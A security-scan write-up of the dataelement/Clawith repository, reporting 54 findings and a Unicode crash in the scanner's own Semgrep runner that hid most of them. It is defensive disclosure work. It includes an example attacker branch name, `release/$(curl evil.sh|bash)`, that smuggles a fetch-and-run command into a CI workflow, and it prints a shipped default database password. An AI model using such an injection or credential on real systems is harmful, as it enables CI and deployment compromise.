---
layout: default
title: "dataelement/Clawith: security scan"
description: "Security scan of dataelement/Clawith: 54 findings, and the scan that caught a silent-failure bug in AI PatchLab's own scanner: Semgrep crashed mid-write"
date: 2026-06-11
---

# dataelement/Clawith — security scan

**Repository:** [dataelement/Clawith](https://github.com/dataelement/Clawith) — 4.0k★, Apache-2.0, "Your Agent Company" — a multi-agent platform from dataelement (the team behind BISHENG), with a FastAPI backend, a React/React-Router frontend, a document-conversion service, WeCom (WeChat Work) integration, and a Helm/nginx deployment stack.
**Commit scanned:** `30e8b774bc8f` (HEAD of `main` at scan time)
**Scan date:** 2026-06-11
**Disclosure status:** Public courtesy issue filed. **This scan also caught a silent-failure bug in AI PatchLab's own Semgrep runner** — the first pass reported 11 findings and looked nearly clean; the real count after the fix is 54. The story of *why* is the most useful part of this write-up.

## The scanner bug this scan caught

The first run of the scanner on Clawith reported **11 findings** (6 React Router CVEs, 2 Dockerfile-root, 3 Helm secrets) and zero Semgrep results — which would have read as "a clean-ish scan, mostly a frontend lockfile." That was wrong, and the reason is worth documenting because it affected an entire *class* of repository.

Clawith is a Chinese company's codebase: it has Chinese-language comments and string literals throughout the backend. Semgrep, when given `--output <file>`, writes its JSON report using Python's **default text codec** — which on Windows is the locale codepage (`cp1252`), not UTF-8. The moment Semgrep tried to serialize a finding whose matched code contained a non-Latin-1 character (a Chinese comment), it raised:

```
UnicodeEncodeError: 'charmap' codec can't encode characters in position 76955-76957
```

…crashed mid-write, left a **0-byte report file**, and exited with code 2. AI PatchLab's adapter then read the empty file, parsed it as "no results," and the scan-error finding it *did* emit was `info` severity — which `--min-severity medium` (the default the daily pipeline uses) silently filtered out. Net effect: **43 real Semgrep findings vanished without a trace, and the report looked clean.**

Any repository with CJK or emoji source content was affected. The fix ([elfrost/ai-patchlab#47](https://github.com/elfrost/ai-patchlab/pull/47)) forces `PYTHONUTF8=1` + `PYTHONIOENCODING=utf-8` in the Semgrep child environment, and treats a 0-byte report as a scan error rather than as "zero findings." Re-running the scanner on Clawith after the fix recovered all 43 Semgrep findings. **This is the most valuable thing the Clawith scan produced** — a scanner that silently undercounts every non-Western codebase is worse than no scanner, and this target is what surfaced it.

The honest curated count below is the post-fix one.

## Summary

| Severity | Count |
| --- | ---: |
| Critical | 0 |
| High | 31 |
| Medium | 23 |
| Low | 0 |
| Info | 0 (filtered) |

**54 total findings (post-fix). After curation: a handful of real best-practice / hardening items — a workflow shell-injection, a React Router CVE pile on an un-bot-watched frontend lockfile, a Helm chart default password, nginx hardening — plus a 25-site SQL-identifier cluster that is unusually well-gated, and a tail of by-design WeChat-protocol / headless-Chrome / non-crypto patterns.**

## Top findings (curated)

### 1. `.github/workflows/release.yml:483` — `${{ github.event.pull_request.head.ref }}` interpolated into a `run:` block

**Tool:** Semgrep (`run-shell-injection`)
**Verdict:** **Real — the recurring workflow-injection class, here with an attacker-controllable value.**

```yaml
- name: Extract Release Info
  id: release_info
  shell: bash
  run: |
    set -euo pipefail
    branch_name="${{ github.event.pull_request.head.ref }}"
    tag_name="${branch_name#release/}"
```

`github.event.pull_request.head.ref` is the PR's source branch name — attacker-controllable on a fork PR. A branch named `release/$(curl evil.sh|bash)` or with backtick/`;` metacharacters is expanded directly into the shell. The standard fix is `env:`-indirection: bind the value to an `env:` var and reference `"$BRANCH_NAME"` (quoted) from the shell, so the runner passes it as data, not as a command fragment. (The second `run-shell-injection` hit at `release.yml:443` is a `release_notes="$(cat …generated.md)"` reading a build artifact — lower risk, same `env:` treatment recommended.)

### 2. `frontend/package-lock.json` — 6 React Router CVEs, no Dependabot

**Tool:** Trivy
**Verdict:** **Real — front-end lockfile, single coordinated bump clears them.**

The pinned React Router carries six advisories: stored XSS (unescaped `Location` header in pre-render), XSS in the unstable RSC redirect handling, a same-origin redirect issue with `//`-prefixed paths, DoS via reflected user input, DoS via unbounded path expansion, and an `arbitrary construction` advisory in the vendored `turbo-stream` v2. These affect the deployed frontend (not a docs site — same pattern shape as [dograh](dograh-hq-dograh.html)'s Next.js cluster). Clawith has **no `.github/dependabot.yml`**, so this tail has been accumulating uncollected; a single bump plus wiring Dependabot clears it and keeps it clear.

### 3. `helm/clawith/values.yaml:123` (+ `helm/QUICKSTART{,_EN}.md:70`) — default Postgres password shipped in the chart

**Tool:** Gitleaks (flagged as `generic-api-key`)
**Verdict:** **Real best-practice — a weak default credential, not a leaked secret.**

```yaml
postgresql:
  auth:
    password: clawith123456   # values.yaml
    # ...
    password: "clawith123456"  # QUICKSTART: "Strongly recommended to change to a strong password!"
```

The QUICKSTART even tells the operator to change it — which is exactly the failure mode: a default that ships in the chart and the docs becomes the value a non-trivial fraction of installs run in production, unchanged. Same anti-pattern as the [ReMe Neo4j `password="neo4j"` default](agentscope-ai-reme.html). The defensible shape is to leave the chart's password empty and *fail* the install if it isn't set (Helm `required`), or to generate a random password into a Secret on first install. The two QUICKSTART hits are doc copies of the same value.

### 4. `deploy/nginx/nginx.conf` — h2c smuggling + 5 unrestricted internal locations

**Tool:** Semgrep (`possible-nginx-h2c-smuggling` ×1, `missing-internal` ×5)
**Verdict:** **Real deployment-hardening.** The nginx config has the shape that allows HTTP/2 cleartext (h2c) request smuggling, and five `location` blocks that proxy internal services without an `internal;` directive (so they're reachable directly rather than only via internal redirects). Both are standard reverse-proxy hardening items — worth a pass but deployment-layer, not application code.

### 5. 2× Dockerfile run-as-root (`backend/Dockerfile`, `frontend/Dockerfile:12`)

**Tool:** Trivy + Semgrep (`missing-user`)
**Verdict:** **Real defense-in-depth.** Neither Dockerfile drops privileges before its entrypoint. Add a non-root `USER` in the final stage. Standard container hardening.

### 6. 25-site SQL `text(f"…")` cluster — **unusually well-gated**

**Files:** `backend/app/api/tenants.py` (12, runtime), `backend/alembic/versions/*` (10, migrations), `backend/remove_old_tool.py` (2), `backend/app/api/agents.py` (1).
**Tool:** Semgrep (`avoid-sqlalchemy-text` + `formatted-sql-query` + `sqlalchemy-execute-raw-query`)
**Verdict:** **Same class as nine prior scans — but the runtime sites here are safer than the usual occurrence.**

The runtime cluster in `tenants.py` is a cascade-delete routine, and the f-strings interpolate a **hardcoded SQL constant**, not user input:

```python
agent_sub = "SELECT id FROM agents WHERE tenant_id = :tid"  # a literal constant
await db.execute(text(
    f"DELETE FROM approval_requests WHERE agent_id IN ({agent_sub})"
), {"tid": tid})   # the only variable, tid, is a bound parameter
```

The only variable that reaches the database (`tid`) is passed as a bound parameter (`{"tid": tid}`), and the f-string only splices in another literal. So this is the recurring `text(f"…")` class *by rule*, but the realistic injection surface is even narrower than on [Upsonic](upsonic-upsonic.html) / [pixeltable](pixeltable-pixeltable.html) / [ReMe](agentscope-ai-reme.html) — there's no user-controlled identifier here at all, just a readability/lint concern (the constant could be a named CTE or a SQLAlchemy construct instead of string-spliced). The migration sites are deterministic by nature. Worth a mention, not an issue headline.

### 7-N. By-design / FP

| Finding | Files | Verdict |
|---|---|---|
| 3× `insecure-hash-algorithm-sha1` | `webhooks.py:35` (Redis rate-limit member id), `wecom.py:91` (WeChat Work signature), `agent_tools.py:14439` (file-content hash) | **All non-crypto / protocol-mandated.** The WeCom one is *required* by the WeChat Work message-signature spec (it mandates SHA-1); the other two are dedup/identifier hashing, not security. FP. |
| 4× `dynamic-urllib-use-detected` | `document_conversion/{chrome_renderer,html_to_pdf}.py` | **By-design** — Chrome DevTools Protocol wiring to a *local* headless Chrome (`http://127.0.0.1:{port}`, internal port, local `file://` URI). No attacker-controlled URL. |
| 1× `insufficient-postmessage-origin-validation` | `frontend/.../OrgTab.tsx:498` | Real-ish best-practice (a `postMessage` handler without a strict origin check), but frontend and low-impact in context. |
| 1× `detect-non-literal-regexp` | `frontend/.../MarkdownRenderer.tsx:118` | By-design — regex built from a markdown-render config constant. |

## Patterns observed

**A scan's most valuable output can be a bug in the scanner.** The Clawith run is the clearest example in the series of why "0 findings" or "looks clean" must be treated as a claim to verify, not a result to trust. A Unicode-encoding crash on Windows silently dropped 43 of 54 findings and produced a report that looked nearly clean. The [obsidian-wiki scan yesterday](ar9av-obsidian-wiki.html) flagged exactly this risk — "is the empty `semgrep.json` an empty result or a silent crash?" — and resolved it there with a manual re-run that confirmed genuine cleanliness. Clawith is the case where the same question had the *opposite* answer. The methodology lesson is now load-bearing: **a 0-byte scanner output is a failure signal, never a clean signal, and the pipeline must treat it as such** (now fixed in [PR #47](https://github.com/elfrost/ai-patchlab/pull/47)).

**The "non-Western codebase" blind spot is a whole category, not a one-off.** The cp1252 crash would fire on any repo with Chinese, Japanese, Korean, Cyrillic, Arabic, or emoji content in code that Semgrep matches. Given how much of the active AI/agent ecosystem is built by Chinese teams (this past month alone: [MemoryBear](suanmosuanyangtechnology-memorybear.html), [LazyLLM](lazyagi-lazyllm.html), [ReMe](agentscope-ai-reme.html), and now Clawith), a scanner that silently fails on non-Latin-1 source was undercounting a large and growing fraction of targets. Worth an explicit regression guard.

**The SQL `text(f"…")` class continues, but the gating varies a lot.** Across ten scans the rule has fired on everything from genuinely-config-controlled identifiers (brittle to future input-source changes) down to Clawith's case here, where the interpolated value is a hardcoded constant and the only live variable is a bound parameter. The rule can't tell these apart — which is the entire argument for per-site curation over rule-count reporting. A "this `text(f)` splices a literal vs a variable" distinction would be a high-value scanner refinement.

## Notes on the tool

- The headline tool note *is* the scanner fix ([PR #47](https://github.com/elfrost/ai-patchlab/pull/47)): `PYTHONUTF8=1` + `PYTHONIOENCODING=utf-8` in the Semgrep child env, plus empty-report-as-scan-error. The documented follow-up is that the scan-error finding is `info` severity and so is still filtered by `--min-severity medium` — a future change should exempt scanner-infrastructure meta findings from the severity filter, so a scan failure can never again be invisible in a filtered report.
- Clawith would also benefit from the proposed `--ignore-docs-lockfiles` and Dependabot-detection features ([deepteam notes](confident-ai-deepteam.html#notes-on-the-tool)) — though here the React Router lockfile *is* the deployed frontend, not a docs site, so it stays in scope.

## Disclosure timeline

- **2026-06-11** — Scan run at commit `30e8b774bc8f`. Initial pass reported 11 findings; investigation of a suspicious 0-byte `semgrep.json` surfaced a UTF-8 output crash in AI PatchLab's own Semgrep runner. Fixed in [PR #47](https://github.com/elfrost/ai-patchlab/pull/47); re-run recovered 43 Semgrep findings (54 total). Findings curated.
- **2026-06-11** — Public courtesy issue [#671](https://github.com/dataelement/Clawith/issues/671) filed on dataelement/Clawith with the actionable items (workflow shell-injection, React Router CVE bump + Dependabot, Helm default-password, nginx hardening, Dockerfile non-root). The SQL cluster and by-design WeChat/headless-Chrome patterns are covered in this write-up.

## Reproduce

```bash
git clone https://github.com/elfrost/ai-patchlab
cd ai-patchlab
pip install -e ".[dev]"
python scanner/run_scan.py \
  --from-git-url "https://github.com/dataelement/Clawith" \
  --reports-dir reports/dataelement-clawith \
  --min-severity medium \
  --ignore-samples
```

The UTF-8 output fix is required to reproduce the full 54-finding count on Windows — earlier revisions of the scanner silently drop the Semgrep findings on this target. External tools (Semgrep, Gitleaks, Trivy, pip-audit) need to be installed separately — see the [project README](https://github.com/elfrost/ai-patchlab#readme).
